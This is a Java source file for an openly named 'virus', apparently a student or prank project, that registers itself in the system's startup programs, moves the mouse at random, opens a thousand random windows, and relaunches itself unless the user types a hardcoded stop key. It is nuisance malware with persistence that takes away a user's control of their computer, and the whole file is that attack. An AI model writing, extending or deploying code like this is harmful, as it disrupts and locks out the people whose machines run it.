package com.joo.jframevirus;

import com.joo.jframevirus.autostart.AutoStartManager;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;

public class MainController {
    private Dimension screenSize;
    private Robot robot;

    public MainController() {
        init();
        AutoStartManager.getInstance().addVirusToStartup();
        startMouseMoving();
        startRandomFrame();
        setupWindowListener();
    }

    private void init() {
        screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
    }

    // TODO: 5/15/22 Tst this in windows
    private void setupWindowListener() {
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
            if (e.getID() == KeyEvent.KEY_PRESSED) {
                if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
                    VirusStopKey();
//                    // Remove the virus from the startup programs
//                    AutoStartManager.getInstance().removeVirusFromStartup();
//                    // Exit the virus
//                    System.exit(0);
                }
            }
            return false;
        });
    }

    public void startMouseMoving() {
        new Thread(() -> {
            // TODO: 5/15/22 Make this a while loop
            for (byte i = 0; i < 10; i++) {
                robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
                        (int) (Math.random() * screenSize.getHeight()));
            }
        }).start();
    }
    public void startRandomFrame(){
        new Thread(() -> {
            for (int i = 0; i < 1000; i++) {
                new RandomFrame(screenSize);
            }
        }).start();
    }
    public void VirusStopKey(){
           String input;
           String Key = "AnasAndJooVirus8092789166";
           String Massage ="To stop virus write Key ";
             try {
             input = JOptionPane.showInputDialog(Massage);
             if (input.equals(Key)){
                 System.exit(0);
             }
             } catch (Exception e) {
                 new MainController();
             }
    }
}
